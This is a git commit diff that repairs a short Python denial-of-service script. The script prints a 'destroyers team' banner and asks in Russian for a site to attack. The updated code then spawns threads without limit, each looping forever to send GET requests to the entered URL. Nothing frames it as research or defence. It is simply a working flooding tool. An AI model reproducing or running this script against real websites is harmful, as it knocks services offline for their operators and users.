cda9d417e6725de995403f2270f1b0348695e3ff
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-07-25 03:38:50 +0300

    Update gOfqbk.py

--- gOfqbk.py
+++ gOfqbk.py
@@ -1,16 +1,14 @@
 import threading
 import requests
-import Thread
 
 print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")
 
 targ = input("Введите ссылку на сайт для атаки: ")
-targ = input('Threads: ')
+
 def ddos():
+ while True:
+  requests.get(targ)
+  print("[+] Заход на сайт выполнен!")
+  
 while True:
-  requests.post(url)
-  requests.get(url)
-for i in range(int(thrnom)):
-while True:
-threading.Thread(target=ddos).start()
-print("[+] Заход на сайт выполнен!")
+ threading.Thread(target=ddos).start()
